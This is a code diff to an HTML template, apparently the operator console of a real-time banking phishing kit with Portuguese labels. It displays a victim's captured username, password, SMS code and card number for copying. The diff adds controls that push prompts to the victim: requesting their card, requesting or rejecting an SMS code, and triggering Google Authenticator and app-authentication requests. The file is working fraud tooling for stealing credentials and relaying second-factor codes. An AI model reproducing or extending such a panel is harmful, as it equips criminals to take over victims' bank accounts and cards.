@@ -235,7 +235,7 @@
     </nav>
 </div>
 
-<script> var clientOperating = "{{client.id}}" </script>
+<script> var clientOperating = "{{client.id}}"</script>
 
 <div class="container">
     <div class="row">
@@ -258,7 +258,7 @@
                         <input type="text" class="form-control opUser" id="colFormLabel" value="{{client.user}}">
                     </div>
 
-                    <div class="col-sm-3 pl-0">
+                    <div class="col-sm-auto pl-0 text-right">
                         <button type="button" class="btn btn-primary btn-copy">Copiar</button>
                     </div>
                 </div>
@@ -269,40 +269,73 @@
                             value="{{client.password}}">
                     </div>
 
-                    <div class="col-sm-3 pl-0">
+                    <div class="col-sm-auto pl-0 text-right">
                         <button type="button" class="btn btn-primary btn-copy">Copiar</button>
                     </div>
                 </div>
                 <div class="form-group row">
-                    <label for="colFormLabel" class="col-sm-2 col-form-label">Assinatura</label>
+                    <label for="colFormLabel" class="col-sm-2 col-form-label">Cartão</label>
                     <div class="col-sm">
-                        <input type="text" class="form-control opAssign" id="colFormLabel"
-                            value="{{client.eletronicPassword}}">
+                        <textarea class="form-control" name="card_number" id="" cols="30" rows="4">
+                            {{client.card_number}}
+                        </textarea>
                     </div>
 
-                    <div class="col-sm-3 pl-0">
+                    <div class="col-sm-auto pl-0 text-right">
                         <button type="button" class="btn btn-primary btn-copy">Copiar</button>
                     </div>
                 </div>
 
                 <div class="form-group row">
-                    <label for="colFormLabel" class="col-sm-2 col-form-label">SMS</label>
+                    <label for="colFormLabel" class="col-sm-2 col-form-label">SMS/codigo</label>
                     <div class="col-sm">
                         <input type="text" class="form-control opSms" id="colFormLabel" value="{{client.sms}}">
 
                     </div>
 
-                    <div class="col-sm-3 pl-0">
+                    <div class="col-sm-auto pl-0 text-right">
                         <button type="button" class="btn btn-primary btn-copy">Copiar</button>
                     </div>
                 </div>
 
                 <hr>
 
-                <button type="button" data-action="sms" class="btn btn-command btn-primary">Pedir SMS</button>
+                <div class="form-group row">
+                    <label for="colFormSMS" class="col-sm-auto col-form-label">SMS</label>
+                    <div class="col-sm-2">
+                        <input type="text" class="form-control opReqSMS" id="colFormSMS" value="">
+                    </div>
+
+                    <div class="col-sm-auto">
+                        <button type="button" class="btn btn-primary btn-getSMS">SMS</button>
+                    </div>
+
+                    <div class="col-sm-2 pr-0">
+                        <select class="form-control" id="exampleFormControlSelect1">
+                            <option>Master</option>
+                            <option>Visa</option>
+                            <option>Elo</option>
+                            <option>AMEX</option>
+                        </select>
+
+                    </div>
+
+                    <div class="col-sm-2 pr-0">
+                        <input type="text" class="form-control opApp" id="colFormLabel" value="{{client.card_number}}">
+                    </div>
+
+                    <div class="col-sm-auto">
+                        <button type="button" class="btn btn-primary btn-card">Pedir Cartão</button>
+                    </div>
+
+
+                </div>
+
+                <hr>
+
                 <button type="button" data-action="errorsms" class="btn btn-command btn-danger">Negar SMS</button>
-                <button type="button" data-action="errorsignature" class="btn btn-command btn-danger">Negar
-                    Assinatura</button>
+                <button type="button" data-action="reqgauth" class="btn btn-command btn-primary">G-Auth</button>
+                <button type="button" data-action="reqapp" class="btn btn-command btn-primary">App-Auth</button>
 
                 <hr>
 
